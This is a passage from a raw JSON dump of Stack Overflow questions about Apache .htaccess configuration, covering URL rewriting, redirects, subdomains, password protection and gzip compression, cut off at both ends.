do I exclude this page from the above htaccess rule? (let's pretend I know the full path/file location that I want to exclude, and it's /news/)</p>\n\n<p>Thanks for your help in advance.</p>\n"},{"tags":["php",".htaccess","zend-framework"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":219,"score":1,"question_id":7762991,"title":"Add subdomain index page in .htaccess file","body":"<p>I am using zend framework and i have .htaccess file in web directory which is redirect to public/index.php .\nMy web directory structure is given below:</p>\n\n<pre><code>webroot/\n   application/\n      controllers/\n      views/\n         scripts/\n   library/\n   public/\n     index.php     \n   tests/\n   .htaccess\n</code></pre>\n\n<p>My .htaccess code is given below: </p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^\\.htaccess$ - [F]\n\nRewriteCond %{REQUEST_URI} =\"\"\nRewriteRule ^.*$ /public/index.php [NC,L]\n\n\nRewriteCond %{REQUEST_URI} !^/public/.*$\nRewriteRule ^(.*)$ /public/$1\n\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule ^.*$ - [NC,L]\n\nRewriteRule ^public/.*$ /public/index.php [NC,L]  \n</code></pre>\n\n<p>After that i create a subdomain i.e \"sub.mydomain.com\" .</p>\n\n<p>then my webroot directory given below:</p>\n\n<pre><code>webroot/\n       sub/\n       application/\n          controllers/\n          views/\n             scripts/\n       library/\n       public/\n         index.php     \n       tests/\n       .htaccess\n</code></pre>\n\n<p>when i open then error msg come :</p>\n\n<pre><code>The requested URL /public/sub/ was not found on this server.\n\nAdditionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.\n</code></pre>\n\n<p>when i delete above htaccess file code then my subdomain sub.mydomain.com is open .\nI want to change my code of htaccess file. In which both my domaine or subdomain is run....please help me...</p>\n"},{"tags":["regex",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12386854,"title":".htacess urlrewrite remove number","body":"<p>I need to write a regular expression to remove a large number from the end of the URL.</p>\n\n<p>Here are some examples:</p>\n\n<pre><code>/uk/futsal-cosmos-10-panel-match-football-white-purple-24100787502654/\n/uk/escape-t400-individual-rubber-dumbbells-up-to-50kg-2289101502719397/\n/uk/golds-gym-standard-hammertone-plate-25-4mm-1-25kg-x-12-1736702088365877/\n</code></pre>\n\n<p>So basically I need the final numbers removed including the dash.</p>\n\n<p>In the third example, this should become:</p>\n\n<pre><code>/uk/golds-gym-standard-hammertone-plate-25-4mm-1-25kg-x-12/\n</code></pre>\n\n<p>i.e. the 12 should remain.</p>\n"},{"tags":["apache",".htaccess","password-protection",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12388031,"title":"Apache2: Password protected directory - website cannot connect to its own server","body":"<p>I have protected a directory where my website is placed with password (.htaccess + .htpasswd). The protection works like a charm. However, there is one problem. On the same domain I have SOLR server set up and my website uses remote connections to retrieve data from it (ie. PHP's file_get_contents). Unfortunately this does not work as it is password protected as well.</p>\n\n<p>What do I do to allow my server to connect to itself without HTTP authentication? Is it possible?</p>\n\n<p>Thanks a lot!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12385210,"title":"htaccess rewrite part of filename to url","body":"<p>I can't figure out how to rewrite this:</p>\n\n<pre><code>/part-filename.php\n</code></pre>\n\n<p>to</p>\n\n<pre><code>/part/filename.php\n</code></pre>\n\n<p>/part/ is not an existing directory.</p>\n\n<p>I know it should be quite easy, but can't find how to search for 'part' in the filename and translate that to a sub level in the url.</p>\n\n<p>Thanks in advance for your help!</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12380256,"title":"How do you solve this issue with htaccess?","body":"<p>Could you help me with this htaccess problem of mine?</p>\n\n<p>My URL is:</p>\n\n<pre><code>mysite.com/blog.php?post=01/01/2012/my-first-post\n</code></pre>\n\n<p>And I want to transform it into this:</p>\n\n<pre><code>mysite.com/post/01/01/2012/my-first-post/\n</code></pre>\n\n<p>Which I partially solve this by using this:</p>\n\n<pre><code>RewriteRule    ^post/([A-Za-z0-9-]+)/?$    blog.php?postd=$1    [NC,L]\n</code></pre>\n\n<p>Now here comes the problem. When I try to click the second post \"01/01/2012/my-second-post\" which was suppose to go to </p>\n\n<pre><code>mysite.com/post/01/01/2012/my-second-post\n</code></pre>\n\n<p>but in return it goes to</p>\n\n<pre><code>mysite.com/post/01/01/2012/my-first-post/01/01/2012/my-second-post\n</code></pre>\n"},{"tags":["php","html",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12385618,"title":"using .htaccess to rename .php files .html?","body":"<p>just wondering if there will be any problems renaming .php files .html files via .htaccess?\nOur existing site is html and I want to update the pages with dynamic php pages, but people have links saved to the existing html site. If this isn't possible, is my only way to create html pages with iframes to wrap the php pages in?</p>\n\n<p>thanks :)</p>\n"}]}
{"total":14528,"page":18,"pagesize":100,"questions":[{"tags":["php",".htaccess","mod-rewrite"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":147,"score":0,"question_id":12372096,"title":"Remove .PHP File Extension in URL","body":"<p>I am having a little  issue forcing the .php file extension to be removed in the URL.</p>\n\n<p>I am successfully able to remove .php file extension if user:</p>\n\n<pre><code>#Remove PHP if original request is /foo/bar.php\nRewriteCond %{THE_REQUEST} \"^[^ ]* .*?\\.php[? ].*$\"\nRewriteRule ^(.*)\\.php(\\?.*)?$ $1$2 [R=301,L]\n</code></pre>\n\n<p>My goal is to get it also to remove the extension if: </p>\n\n<pre><code># Remove PHP if original request is /foo.php/bar\n</code></pre>\n\n<p>I ask because right now a user can go to the URL and type <a href=\"http://www.site.com/contact.php/about\" rel=\"nofollow\">http://www.site.com/contact.php/about</a> and it will render my about page. My goal is force the removal of the .php and render:\n<a href=\"http://www.site.com/contact/about\" rel=\"nofollow\">http://www.site.com/contact/about</a></p>\n\n<p>I was hoping to take the code I have above and add it to but I can not figure it out.</p>\n\n<p>TIA</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12384559,"title":"Conditional rewriting in htaccess file","body":"<p>I'm rather new to the whole .htaccess thing and I'm using the following right now to use 'pretty url's':</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ index.php?path=$1 [NS,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Now i found my website a bit slow and decided to start gzipping my CSS files thru a php script I found somewhere on the web (<a href=\"http://www.wangarific.com/how-to-gzip-css-files/\" rel=\"nofollow\">the website</a>). For this to work I need to rewrite the url to open the correct php file. That would look something like this:</p>\n\n<pre><code>RewriteRule ^(.*).css$ /csszip.php?file=$1.css [L]\n</code></pre>\n\n<p>But I only want the first to happen when the second doesn't and vice versa. In other words i'd like something like this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    if request doesn't contain .css do\n        RewriteCond %{REQUEST_FILENAME} !-d\n        RewriteCond %{REQUEST_FILENAME} !-f\n        RewriteRule ^(.*)$ index.php?path=$1 [NS,L]\n    else do\n        RewriteRule ^(.*).css$ /csszip.php?file=$1.css [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Can anyone help me with the proper code or a place where i can find a way to use some kind of conditional statement in htaccess files?</p>\n\n<p>Thanks in Advance!:)</p>\n"},{"tags":[".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":25,"score":-2,"question_id":12382830,"title":"What is .htaccess file. Why we use this file. what are the advantages of using this file?","body":"<p>As per my research this file is used for Url rewrites.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12379561,"title":"htaccess rule apply query string rule and change the url","body":"<pre><code> /index.php?search_category=32\nto\n/32\n</code></pre>\n\n<p>How to do this by <code>.htacces</code>s in a way that when <code>\"/index.php?search_category=32\"</code> appear it auto change to <code>\"/32\"</code> with the same query string rules?.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["regex",".htaccess","codeigniter","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12351085,"title":"Change specific string in URL with htaccess and regex","body":"<p>Could you please help me to write .htaccess rewrite rule that will rewrite one string in URL to another (in this case user -> profile):</p>\n\n<p>eg: <a href=\"http://my.site.com/index.php/user/194/\" rel=\"nofollow\">http://my.site.com/index.php/user/194/</a></p>\n\n<p>It should be like this to work</p>\n\n<p>eg: <a href=\"http://my.site.com/index.php/profile/194/\" rel=\"nofollow\">http://my.site.com/index.php/profile/194/</a></p>\n\n<p>It should also change all \"user\" words to \"profile\", not just the first.</p>\n\n<p>I have tried with the following code but it is not working for some reason:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^user=([^&amp;]*) [NC]\nRewriteRule ^ %{REQUEST_URI}?profile=%1 [R=301,L]\n</code></pre>\n\n<p>Please assist. Thank you all in advance. </p>\n"},{"tags":["php","linux",".htaccess","webserver","godaddy"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":128,"score":2,"question_id":11631956,"title":"Filesmatch direction in htaccess with GoDaddy","body":"<p>I created a hosting account with GoDaddy and would like to move over my working PHP project that's working fine on 1&amp;1. </p>\n\n<p>I use a direction like:</p>\n\n<pre><code>&lt;FilesMatch \"^(site|media2|sitemap.xml)$\"&gt;\n    SetHandler  x-httpd-php5 \n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>to process any links that contain either site, media or sitemap.xml as php. Now I'd like to set the same handler on GoDaddy but it must be different than on 1&amp;1 and I haven't been able to find the correct syntax. </p>\n\n<p>Any recommendations?</p>\n"},{"tags":["php",".htaccess","include"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":12380144,"title":"something messy with .htaccess while using php include","body":"<p>I am currently working on a web application where i want to give user access to their profile by typing www.mysitename.com/username this is working fine with .htaccess but i also want the user to access other pages with clean urls by redirecting</p>\n\n<p><a href=\"http://www.mysitename.com/song-type-one.php?song=xyz\" rel=\"nofollow\">http://www.mysitename.com/song-type-one.php?song=xyz</a> to\n<a href=\"http://www.mysitename.com/song-type-one.php/song/xyz\" rel=\"nofollow\">http://www.mysitename.com/song-type-one.php/song/xyz</a></p>\n\n<p>i used the rewrite rule like this</p>\n\n<pre><code>RewriteRule ^(.*)$ ./song-type-one.php?song=$1 \nRewriteRule ^lok-songs/(.*)$ .song-type-one.php?song=$1  \n</code></pre>\n\n<p>if i type the clean url now in the browser only my main content is loaded the css, javascript and my php include are not loaded. there might be something wrong with my .htaccess whats the best way to achieve all rules i want with .htaccess ?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12380074,"title":"Remove leading slash from <link href> and other references using htaccess","body":"<p>I have a dev server where I've uploaded a copy of a clients old site to:</p>\n\n<pre><code>/dev/name/old/\n</code></pre>\n\n<p>Within the old site, there are a lot of references to </p>\n\n<pre><code>/\n</code></pre>\n\n<p>Example:</p>\n\n<pre><code>/css/stylesheet.css\n/js/script.js\n/images/img.jpg\n</code></pre>\n\n<p>Desired structure:</p>\n\n<pre><code>/dev/name/old/css/stylesheet.css\n/dev/name/old/js/script.js\n/dev/name/old/images/img.jpg\n</code></pre>\n\n<p>Is there a way or redirecting all references with a leading slash to the sub directory, with a htaccess file that is in the sub directory?</p>\n\n<p>Apologies for repeat question, I've tried a number of solutions but to no avail</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12379258,"title":"one wordpress folder for multiple sites on local install + htaccess","body":"<p>I've got about 30 sites on my local XAMPP install. Instead of having every site folder hold the current WordPress version, themes and plugins. I'd like to create a folder that holds WordPress so every site is always using the latest version.</p>\n\n<h2>Sites</h2>\n\n<p><strong>/wordpress/</strong> <em>all core files, including wp-admin, wp-content (core or multiuse plugins and themes) &amp; wp-includes</em></p>\n\n<p><strong>/site-1/</strong></p>\n\n<p><strong>/site-2/</strong></p>\n\n<p>etc.</p>\n\n<p>In <code>site-1</code> In each site I am assuming I would need an <code>index.php</code>, <code>wp-config.php</code> and <code>.htaccess</code> file. </p>\n\n<p>Testing the <code>index.php</code> file I would need to do the following:</p>\n\n<pre><code>define('WP_USE_THEMES', true);\n\n/** Loads the WordPress Environment and Template */\nrequire('./wp-config.php'); //for current environment settings.\nrequire('../wordpress/wp-blog-header.php'); //one folder back.\n</code></pre>\n\n<p>This gets WP loaded, but it can't find site-1.dev/wp-admin. This is where I would need some <code>.htaccess</code> magic to rewrite to the wordpress folder.</p>\n\n<p>Possible? Understand what I am trying to do <strong>without</strong> using Multisite.</p>\n\n<p>I know I'd also need to define a different themes and plugins location. Would this allow plugins and themes inside the <code>/wordpress/</code> folder to be seen? Probably now.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12378156,"title":"Multiple RewriteRule in htaccess","body":"<pre><code>RewriteRule ^([a-zA-Z0-9]+)/$ index.php?$1=1 [L]\nRewriteRule ^([a-zA-Z0-9]+)$ index.php?$1=1 [L]\n\n#if category \nRewriteRule ^category/([a-zA-Z0-9]+)/$ index.php?results=true&amp;lid=$1 [L,NC]\nRewriteRule ^category/([a-zA-Z0-9]+)$ index.php?results=true&amp;lid=$1 [L,NC]\n</code></pre>\n\n<p>the first section works just fine, when i add category in url, it writes category before the other parameters everywhere, so css and images are being disappeared.</p>\n\n<p>mywebsite.com/category/380 should redirect to  mywebsite.com/index.php?results=true&amp;lid=380 which does but the original url has pics and css but the clean url doesn't.</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":12378015,"title":"SSL on domain-A on set folders else domain-B for everything else","body":"<p>I am setting up a new site and am using 2 domains for the site, one is domain-A.com which has a SSL/HTTPS cert on it and domain-B.co.uk</p>\n\n<p>I want all visitors to go to domain-B.co.uk, then when they go to the portal, billing etc... go to <a href=\"https://www.domain-A.com/portal/FILENAME.php\" rel=\"nofollow\">https://www.domain-A.com/portal/FILENAME.php</a></p>\n\n<p>Then when they leave <a href=\"https://www.domain-A.com/portal/\" rel=\"nofollow\">https://www.domain-A.com/portal/</a> change the domain back to <a href=\"http://domain-B.co.uk/FILENAME.php\" rel=\"nofollow\">http://domain-B.co.uk/FILENAME.php</a></p>\n\n<p>So basically using domain-A for set forums that I want SSL on, anything else use domain-B.</p>\n\n<p>I am not sure how to do this, any help please?</p>\n\n<p>Thanks,\nGarry</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12215084,"title":".htaccess mod_rewrite RewriteRule for categories","body":"<p>I wanted to have <a href=\"http://www.mywebsite.com/cd2012/legal\" rel=\"nofollow\">http://www.mywebsite.com/cd2012/legal</a> rather than <a href=\"http://www.mywebsite.com/cd2012/index.php?legal=1\" rel=\"nofollow\">http://www.mywebsite.com/cd2012/index.php?legal=1</a></p>\n\n<p>i have tried </p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteRule guarantees/(.*) cd2012/index\\.php/legal=$1 [R=301,L]\nRewriteRule guarantees cd2012/index\\.php/legal=$1 [R=301,L]\nRewriteRule ^guarantees/$ cd2012/index\\.php/legal=$1 [R=301,L]\n</code></pre>\n\n<p>none of them working.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12377162,"title":"mod_rewrite in .htaccess file for unknown first part of path","body":"<p>I am trying to write a rewrite rule to change path slugs to query parameters. It is for a web service, and should only rewrite this rule if the host starts with api. There are two slugs that I am trying to capture and rewrite. The first is optional and is a version (i.e. v1.2) and the second is the service domain (i.e. customers, transactions, etc.).</p>\n\n<p><a href=\"http://api.domain.com/v2.5/customers\" rel=\"nofollow\">http://api.domain.com/v2.5/customers</a> should rewrite to ?version=2.5&amp;domain=customers</p>\n\n<p>I also want to support a default version so that</p>\n\n<p><a href=\"http://api.domain.com/customers\" rel=\"nofollow\">http://api.domain.com/customers</a> should rewrite to ?version=&amp;domain=customers</p>\n\n<p>Here is what my .htaccess file looks like:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^api\\..*\nRewriteRule ^v([\\d\\.]*)?\\/?([^\\/]*)$ ?version=$1&amp;domain=$2\n</code></pre>\n\n<p>The first example above works fine, but I can't get the default version path to work. I have tried a ton of different things. I thought starting with ^.*v would help, but it didn't. Anybody know how to make it match when you don't know the starting characters?</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12365730,"title":"changing the .htaccess file in wordpress","body":"<p>I was trying to use <code>permalink feature</code> of <code>WordPress</code> on my <code>localhost</code> so I just made copy the code which was <code>generated by WordPress</code> when I clicked on <code>post name from Common Settings</code>. I saved that generated code in my localhost where the <code>wordpress index.php</code> file was stored in the name of <code>.htaccess</code> and now when I am going to visit the page, url bar of the <code>browser is showing the full address of the post</code> but the <code>post can not be seen on the browser</code>.Only the <code>404 Not Found error is comming</code>. Can someone tell me what is the wrong part here?</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":12284259,"title":"301 redirect for old pages of the website with codeIgniter","body":"<p>I have just now upgraded one of my static website to a codeIgniter enabled website. I need to redirect the exact domain names of the old website to the new ones to avoid the 404 error. </p>\n\n<ul>\n<li>Old pages > <code>http://example.com/pagename.php</code></li>\n<li>New pages > <code>http://example.com/index.php/home/category_images/9(cat_id)</code></li>\n</ul>\n\n<p>I do not a very high no. of pages so hard coding all the pages directly will not be a problem. I have tried : </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^http://www.example.com/pagename.php$ http://example.com/index.php/home/category_images/9 [L,R=301]\n</code></pre>\n\n<p>Not working, I have no idea why. <code>mod_rewrite</code> is enable on my apache server. </p>\n\n<p>Also, just for the confirmation please also tell me in which folder I should put this file, I am confused between root dir or Application folder. </p>\n\n<p>Thank you.</p>\n\n<p>Version 2 : Now after suggestion from Mr. Michael, I tried to implement it using the redirect function like this : </p>\n\n<p>Default Controller function : home.php</p>\n\n<pre><code>function __construct()\n{\n    // Call the Model constructor\n    parent::__construct();\n    $this-&gt;load-&gt;model('common_model');\n    $this-&gt;handle_redirects();\n}\n\nfunction handle_redirects () \n{\n    $redirects = Array(\n    'gorgeous-girls.php' =&gt; 'home/category_images/9'\n    );\n    $uri = implode('/', $this-&gt;uri-&gt;segments);\n    foreach ($redirects as $from =&gt; $to)\n    {\n        $from = str_replace(':any', '.+', str_replace(':num', '[0-9]+', $from));\n        if (preg_match(\"#^{$from}$#i\", $uri))\n        {\n        if (strpos($to, '$') !== false and strpos($from, '(') !== false)\n            $to = preg_replace(\"#^{$from}$#i\", $to, $uri);\n        redirect($to , 'location', 301);\n        }\n    }\n}\n</code></pre>\n\n<p>And my .htaccess looks like : </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond $1 !^(index.php|resources|robots.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n</code></pre>\n\n<p>PS : I have removed index.php from my domain name structure. It looks like : www.example.com/controller/function/uri/uri</p>\n\n<p>Now I am not getting an error page from my host, but I am getting an error page from the CodeIgniter. </p>\n\n<p>Please help. </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12376278,"title":"How to redirect a non-existing directory to a sub-domain","body":"<p>During the last 2 hours I'm trying to achieve the following with no success.</p>\n\n<p>I have a domain (lets call it www.test.com) which is assigned to a specific folder in my host, for example : public_html/test.</p>\n\n<p>Now, what I'm trying to do is, I want to redirect a specific url (www.test.com/move) to a subdomain that exists and is assigned to another folder inside the public_html.</p>\n\n<p>I want this to happen only for the specific directory (move) which does not exist inside the test folder.</p>\n\n<p>I guesss this can be done through .htaccesss but I fail miserably every time. </p>\n\n<p>Any ideas on what I miss?</p>\n"},{"tags":[".htaccess","zend-framework"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12376097,"title":".htacess redirect for blog","body":"<p>I have build zend website that exists in folder portofilo. In this level there is another folder blog. So I want the following: when the user try to access subdomain.domain.com/blog I want to redirect him to blog subfolder index.php instead of letting zend to handle it as blog controller. This are my directories:</p>\n\n<pre><code>portofolio/\n    /application\n    /library\n    /public\n        /index.php\n        /.htacess\n\nblog \n    /index.php\n</code></pre>\n\n<p>How can I configure .htacess in zend application public directory so it will redirect only requests with url: subdomain.domain.com/blog/* to blog directory?\nHow can I write </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12334006,"title":"Apache URL rewrite , URL with undefined number of parameters","body":"<p>I have urls of the form</p>\n\n<pre><code>http://www.site.com/someCompany/someEmployee/name/someName/age/someAge/.../keyN/someValueN/\n</code></pre>\n\n<p>I am trying to convert them to the regular key=value form, but cant figure it out.</p>\n\n<p>Can you please help me convert it to</p>\n\n<pre><code>http://www.site.com/someCompany/someEmployee?name=someName&amp;age=someAge&amp;...&amp;keyN=someValueN/\n</code></pre>\n\n<p>Basically, there can be any number of keys and values and its specified in the URL as /key/value/</p>\n\n<p>I read many examples and tutorials but none of them explain processing URLs with variable number of parameters.</p>\n\n<p>Thanks in advance,</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12374917,"title":"pretty url using htaccess rewriterule casuing \"internal server error\"","body":"<p>My .htaccess file:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^([a-zA-Z0-9_-]+)$ photo.php?id=$1\n\nRewriteRule ^([a-zA-Z0-9_-]+)/$ photo.php?id=$1\n</code></pre>\n\n<p>My goal is to convert the url <code>mysite.com/photo.php?id=31</code> to <code>mysite.com/31</code>. But when i visit <code>mysite.com/31</code>, all i get is:</p>\n\n<blockquote>\n  <p>Internal Server Error</p>\n  \n  <p>The server encountered an internal error or misconfiguration and was\n  unable to complete your request.</p>\n  \n  <p>Please contact the server administrator, admin@localhost and inform\n  them of the time the error occurred, and anything you might have done\n  that may have caused the error.</p>\n  \n  <p>More information about this error may be available in the server error\n  log.</p>\n</blockquote>\n\n<p>Im running it on a wamp server.</p>\n\n<p>Edit:</p>\n\n<p>My current url looks like this: <code>http://localhost:8080/img/photo.php?id=1</code>. Do i need to add the <code>/img</code>-part to htaccess?</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12374842,"title":"Is it possible to have php and .htaccess authentication through one form?","body":"<p>I am using both PHP and .htaccess login systems on my website.Both authentications are handled seperately(i.e php by quering database and .htaccess by including password file in root directories). PHP login directs user to the specific page and .htaccess login directs user to a specific directory that includes subdirectories and various files. As per current situation if a user wants to access directories he is required to login twice. First login directs him to a page where he finds a link and clicking on the link again prompts him to enter username and password and directs him to the directory. </p>\n\n<p>Is there a way that would simplify the two authentication problem and make it one. I mean the login system should work in such a way whereif user A logs in he will be directed to the page, and if user B logs through the same login he should be directed to the directories?</p>\n\n<p>Any help would be highly appreciated.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12374535,"title":"htaccess only accept traffic from specific http_referer","body":"<p>I'm trying to set up a htaccess file that would accomplish the following:  </p>\n\n<p>Only allow my website to be viewed if the viewing user is coming from a specific domain (link)</p>\n\n<p>So, for instance.  I have a domain called.  protect.mydomain.com .  I only want people coming from a link on unprotected.mydomain.comm to be able to access protect.mydomain.com.  </p>\n\n<p>The big outstanding issue I have is that if you get to protect.mydomain.com from unprotected.mydomain.com and click on a link in the protect.mydomain.com that goes to another page under protect.mydomain.com then I get sent back to my redirect because the http_referer is protect.mydomain.com .   So to combat that I put in a check to allow the referrer to be protect.mydomain.com as well.  It's not working and access is allowed from everywhere.  Here is my htaccess file. (All this is under https)</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_REFERER} ^https://(.+\\.)*mydomain\\.com\nRewriteCond %1 !^(protect|unprotected)\\.$ \nRewriteRule ^.*$ https://unprotected.mydomain.com/ [R=301,L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":23,"score":0,"question_id":12350654,"title":"Vanity URL But with settings","body":"<p>Just a quick question,</p>\n\n<p>I am making user profiles for my website and would like to include vanity URLS, but the page has a lot of separate information which gets loaded, e.g Followers tab, uploads tab, and each of these have some kind of setting that can be applied like ASC DESC, New/old results etc. What would be the best way to have vanity urls but keep the functionality i require?</p>\n\n<p><a href=\"http://www.site.com/user.php?id=1&amp;content=Followers&amp;Order=(Different\" rel=\"nofollow\">http://www.site.com/user.php?id=1&amp;content=Followers&amp;Order=(Different</a> settings for each result)</p>\n\n<p>But i am wondering if it would be better if i should just name the content differently if someone wanted to search for followers + a limitation, for example</p>\n\n<p><a href=\"http://www.site.com/user.php?id=1&amp;content=NewestFollowers\" rel=\"nofollow\">http://www.site.com/user.php?id=1&amp;content=NewestFollowers</a>,</p>\n\n<p>rather than</p>\n\n<p><a href=\"http://www.site.com/user.php?id=1&amp;content=Followers&amp;Order=Newest\" rel=\"nofollow\">http://www.site.com/user.php?id=1&amp;content=Followers&amp;Order=Newest</a></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12373920,"title":"Internal Server Error - Multiple depth URL string","body":"<p>I am currently using this .htaccess file for my website,</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^u/([^/]+)/[^/]+)/[^/]+)/?$ /index.php?username=$1&amp;content=$2&amp;type=$3 [L,QSA]\nRewriteRule ^u/([^/]+)/[^/]+)/?$ /index.php?username=$1&amp;content=$2 [L,QSA]\nRewriteRule ^u/([^/]+)/?$ /index.php?username=$1 [L,QSA]\n</code></pre>\n\n<p>but i am getting the error</p>\n\n<blockquote>\n  <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>\n</blockquote>\n\n<p>What i am trying to acheive is to turn this url</p>\n\n<pre><code>http://www.site.com/users/index.php?username=$1&amp;content=$2&amp;type=$3\n</code></pre>\n\n<p>into</p>\n\n<pre><code>http://www.site.com/users/username/followers/newest\n</code></pre>\n"},{"tags":["wordpress","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":29,"score":2,"question_id":12372389,"title":"htaccess rewrite interfering with wordpress","body":"<p>Basics:</p>\n\n<p>main site is at: www.example.com</p>\n\n<p>wordpress install is at: www.example.com/blog</p>\n\n<p>client wants some pages within wordpress accessible via: www.example.com/advice/some-page</p>\n\n<p>rewriteengine is working in general but:</p>\n\n<p>if i use htaccess in a directory /advice to redirect any requests for /advice/some-page to /blog/some-page, i see the correct content, but the url is /blog/some-page. i'd like google and users to see /advice/some-page.</p>\n\n<p>my current htaccess in /advice dir:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^(.*)$ blog/$1 [R]\n</code></pre>\n\n<p>I'm really bad at rewrites so any help gratefully received</p>\n"},{"tags":["apache",".htaccess","gzip","mod-deflate"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":146,"score":2,"question_id":12367858,"title":"How can I get Apache gzip compression to work?","body":"<p>I can't get my site to use gzip compression.</p>\n\n<p>I recently watched this video - <a href=\"http://goo.gl/LnvAK\" rel=\"nofollow\">http://goo.gl/LnvAK</a> - by Chris Coyier over at css-tricks.com. In the video, he talks about enabling gzip compression to make websites run faster. </p>\n\n<p>As per his instruction, I linked through to github via html5boilerplate.com, copied the gzip compression code from their .htaccess file, pasted it into my own, and uploaded it to my site.</p>\n\n<p>I've tested it via gzipwtf.com and it doesn't seem to work. Can anyone help me with this?</p>\n\n<p>My .htaccess file looks like this:</p>\n\n<pre><code># ----------------------------------------------------------------------\n# Trim www\n# ----------------------------------------------------------------------\n\nRewriteEngine On\nRewriteCond %{HTTP_HOST} !^orbitprint.com$ [NC]\nRewriteRule ^(.*)$ http://orbitprint.com/$1 [L,R=301]\n\n# ----------------------------------------------------------------------\n# Gzip compression\n# ----------------------------------------------------------------------\n\n&lt;IfModule mod_deflate.c&gt;\n\n  # Force 